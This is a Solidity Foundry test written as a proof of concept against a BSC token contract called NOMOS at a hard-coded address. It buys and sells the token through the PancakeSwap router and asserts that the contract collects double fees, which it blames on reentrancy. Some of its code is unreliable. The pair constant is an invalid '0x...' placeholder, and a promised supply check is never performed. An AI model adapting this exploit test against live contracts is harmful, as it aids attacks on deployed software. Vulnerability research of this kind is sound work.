contract ReentrancyExploit is Test {
    INOMOS constant NOMOS = INOMOS(0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc);
    IUniswapV2Router02 constant router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Pair constant pair = IUniswapV2Pair(0x...); // We'll derive from factory
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // BSC WBNB
    address attacker = address(0xdeadbeef);

    function setUp() public {
        vm.label(address(NOMOS), "NOMOS");
        vm.label(WBNB, "WBNB");
        vm.label(address(router), "Router");
        // Determine the pair address from factory (if not known)
        address factory = router.factory();
        address pairAddr = IUniswapV2Factory(factory).getPair(address(NOMOS), WBNB);
        vm.label(pairAddr, "Pair");
        // Give attacker ETH to buy tokens
        vm.deal(attacker, 1000 ether);
    }

    function testReentrancyInSwapCausesDoubleFeeCollection() public {
        // Preliminary: Ensure swapAndLiquifyEnabled is true (afterPreSale)
        vm.prank(NOMOS.owner());
        NOMOS.afterPreSale();

        // Attacker buys NOMOS tokens from the pair
        vm.startPrank(attacker);
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(NOMOS);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 10 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );
        vm.stopPrank();

        uint256 attackerBalance = NOMOS.balanceOf(attacker);
        require(attackerBalance > 0, "Attacker should have tokens");

        // Record contract token balance before the sell
        uint256 contractBalanceBefore = NOMOS.balanceOf(address(NOMOS));

        // Attacker sells half of his tokens to the pair
        uint256 sellAmount = attackerBalance / 2;
        vm.startPrank(attacker);
        NOMOS.approve(address(router), sellAmount);
        address[] memory pathSell = new address[](2);
        pathSell[0] = address(NOMOS);
        pathSell[1] = WBNB;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0,
            pathSell,
            attacker,
            block.timestamp
        );
        vm.stopPrank();

        uint256 contractBalanceAfter = NOMOS.balanceOf(address(NOMOS));

        // The contract should have increased by more than the expected single fee collection,
        // because the internal transfer during the swap triggers fee logic again.
        // The expected single fee from the sell: sellAmount * (SliquidityFee + SMarketingFee + SBurnFee) / 100
        // = sellAmount * (6+14+6)/100 = sellAmount * 26/100
        uint256 singleFee = sellAmount * 26 / 100;
        // But due to reentrancy, the contract collects that fee again on the same sellAmount when the contract
        // sends tokens to the pair. So total increase should be at least 2 * singleFee.
        uint256 increase = contractBalanceAfter - contractBalanceBefore;
        assertGe(increase, singleFee * 2 - 1, "Contract should have collected at least double fee due to reentrancy");

        // Additional check: the total supply decreased by more than expected (double burn)
        // This is evidence of the vulnerability.
        console.log("Contract balance increase:", increase);
        console.log("Expected single fee:", singleFee);
        console.log("Double fee:", singleFee * 2);
    }
}
